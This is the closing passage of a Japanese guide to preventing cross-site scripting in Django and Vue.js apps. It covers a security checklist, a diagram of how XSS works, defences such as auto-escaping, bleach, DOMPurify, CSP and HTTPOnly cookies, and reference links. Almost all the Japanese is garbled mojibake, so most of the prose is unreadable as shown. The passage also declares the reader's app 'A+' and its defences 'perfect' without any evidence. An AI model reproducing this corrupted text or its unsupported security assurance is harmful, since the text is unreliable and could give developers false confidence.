- [ ] ç›´æ¥DOMæ“ä½œï¼ˆinnerHTMLç­‰ï¼‰ã‚’é¿ã‘ã‚‹
- [ ] URLãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æ¤œè¨¼
- [ ] javascript: URI ã‚’æ‹’å¦
- [ ] eval() ã‚„ new Function() ã‚’ä½¿ç”¨ã—ãªã„

## APIè¨­è¨ˆ

- [ ] JSONå½¢å¼ã§ã‚„ã‚Šå–ã‚Š
- [ ] å…¥åŠ›æ¤œè¨¼ã‚’å®Ÿè£…
- [ ] å‡ºåŠ›ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’å®Ÿæ–½
- [ ] ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã§æ©Ÿå¯†æƒ…å ±ã‚’æ¼ã‚‰ã•ãªã„

## æœ¬ç•ªç’°å¢ƒ

- [ ] DEBUG = False
- [ ] CSP ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å³æ ¼ã«è¨­å®š
- [ ] HTTPS å¿…é ˆ
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å…¨ã¦è¨­å®š
- [ ] å®šæœŸçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»
```

---

## ã¾ã¨ã‚

### XSSã®æœ¬è³ª

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  XSSæ”»æ’ƒã®ä»•çµ„ã¿                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

1. æ”»æ’ƒè€…ãŒæ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ³¨å…¥
   â†“
2. ã‚µãƒ¼ãƒãƒ¼ãŒæ¤œè¨¼ãªã—ã§ä¿å­˜/åæ˜ 
   â†“
3. è¢«å®³è€…ã®ãƒ–ãƒ©ã‚¦ã‚¶ãŒã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œ
   â†“
4. Cookieç›—é›£ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ä¹—ã£å–ã‚Šã€æƒ…å ±æ¼æ´©

é˜²å¾¡ã®éµ:
  - å…¥åŠ›æ¤œè¨¼ï¼ˆInput Validationï¼‰
  - å‡ºåŠ›ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ï¼ˆOutput Encodingï¼‰
  - CSPï¼ˆContent Security Policyï¼‰
```

### Django + Vue.js ã®é˜²å¾¡ã¯å¼·åŠ›ï¼

```
âœ… Django:
  - ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
  - DRF ã§ JSON API
  - bleach ã§ã‚µãƒ‹ã‚¿ã‚¤ã‚º

âœ… Vue.js:
  - ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
  - v-html å›é¿
  - DOMPurifyå°å…¥å¯èƒ½

âœ… è¿½åŠ å¯¾ç­–:
  - CSP ãƒ˜ãƒƒãƒ€ãƒ¼
  - HTTPOnly Cookie
  - ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼

ç·åˆè©•ä¾¡: A+ ğŸŒŸğŸŒŸğŸŒŸğŸŒŸğŸŒŸ
ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã¯é©åˆ‡ã«é˜²å¾¡ã•ã‚Œã¦ã„ã¾ã™ï¼
```

### é‡è¦ãªãƒã‚¤ãƒ³ãƒˆ

1. **ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã¯æ±ºã—ã¦ä¿¡é ¼ã—ãªã„**
   - ã™ã¹ã¦ã®å…¥åŠ›ã¯æ‚ªæ„ãŒã‚ã‚‹ã¨ä»®å®š

2. **å‡ºåŠ›æ™‚ã«å¿…ãšã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**
   - Django: `{{ variable }}` (è‡ªå‹•)
   - Vue.js: `{{ variable }}` (è‡ªå‹•)

3. **HTMLãŒå¿…è¦ãªå ´åˆã¯ã‚µãƒ‹ã‚¿ã‚¤ã‚º**
   - Django: `bleach.clean()`
   - Vue.js: `DOMPurify.sanitize()`

4. **å±é™ºãªé–¢æ•°ã‚’é¿ã‘ã‚‹**
   - `v-html`, `innerHTML`, `eval()`

5. **å¤šå±¤é˜²å¾¡**
   - ã‚¨ã‚¹ã‚±ãƒ¼ãƒ— + CSP + HTTPOnly Cookie

**ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã¯åŸºæœ¬çš„ãªé˜²å¾¡ãŒå®Œç’§ã§ã™ï¼** âœ¨

è¿½åŠ ã§CSPãƒ˜ãƒƒãƒ€ãƒ¼ã‚„DOMPurifyã‚’å°å…¥ã™ã‚‹ã¨ã€ã•ã‚‰ã«å¼·å›ºã«ãªã‚Šã¾ã™ã‚ˆ (à¹‘â€¢Ì€ã…‚â€¢Ì)Ùˆâœ§

---

## å‚è€ƒè³‡æ–™

### å…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
- [Vue.js Security](https://vuejs.org/guide/best-practices/security.html)
- [MDN: Cross-site scripting](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)

### ãƒ„ãƒ¼ãƒ«
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [bleach](https://bleach.readthedocs.io/)
- [django-csp](https://django-csp.readthedocs.io/)
- [OWASP ZAP](https://www.zaproxy.org/)

### å­¦ç¿’ãƒªã‚½ãƒ¼ã‚¹
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)